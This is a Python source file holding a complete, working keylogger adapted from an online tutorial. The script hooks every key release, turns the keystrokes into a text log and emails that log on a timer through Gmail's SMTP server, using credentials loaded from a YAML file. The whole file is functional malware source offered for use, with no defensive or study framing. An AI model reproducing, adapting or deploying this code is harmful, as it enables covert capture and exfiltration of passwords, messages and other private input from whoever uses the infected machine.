#==============================================================================================================
# (c) 2020 real-4w, based on https://www.thepythoncode.com/article/write-a-keylogger-python
#==============================================================================================================
import keyboard # for keylogs 
import smtplib # for sending email using SMTP protocol (gmail)
import yaml
from threading import Semaphore, Timer # Semaphore is for blocking the current thread, Timer is to make a method runs after an `interval` amount of time
#==============================================================================================================
# Make sure you have a file called "kl.yaml" in the CWD, containing variables as follows:
#debug : True
#time : 600
#username : <your email>@gmail.com
#password : <yourpassword | yourapplicationpassword>
#==============================================================================================================
def ProcessYAML (yaml_file) :
    '''This function opens the yaml file and returns the data object'''
    with open(yaml_file) as f:
        y_data = yaml.load(f, Loader=yaml.FullLoader)
        debug = y_data['debug']
        if debug == True : print("YAML file:\n", y_data)
    return (y_data, debug) 
#==============================================================================================================
yaml_data, debug = ProcessYAML('kl.yaml')                                     #yaml settings are global variables
#debug = yaml_data['debug'] 
SEND_REPORT_EVERY = yaml_data['time']
EMAIL_ADDRESS = yaml_data['username']
EMAIL_PASSWORD = yaml_data['password']

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

if __name__ == "__main__":
    if debug == True :
        print("Main", SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()